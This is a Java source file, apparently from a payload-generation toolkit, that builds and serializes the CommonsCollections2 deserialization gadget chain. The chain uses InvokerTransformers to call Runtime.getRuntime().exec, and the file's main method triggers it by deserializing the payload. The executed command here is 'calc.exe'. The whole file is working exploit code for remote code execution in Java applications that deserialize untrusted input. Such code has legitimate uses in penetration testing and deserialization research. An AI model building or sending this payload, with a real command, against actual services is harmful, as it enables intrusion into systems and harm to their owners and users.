package org.payload.cc.CC2;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.util.PriorityQueue;

import static org.Tools.setSerial.serial;
import static org.Tools.setFieldValue.setFieldValue;

public class CommonsCollections2ChainedTransformed {
    public static byte[] CommonsCollections2ChainedTransformed() throws Exception {
        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class}, new String[] { "calc.exe" }),
        };
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        TransformingComparator comparator =  new TransformingComparator(transformerChain);
        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(1);
        queue.add(2);
        setFieldValue(transformerChain,"iTransformers", transformers);
        return serial(queue);
    }
    public static void main(String[] args) throws Exception {
        byte[] arr = CommonsCollections2ChainedTransformed();
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(arr));
        ois.readObject();
    }
}
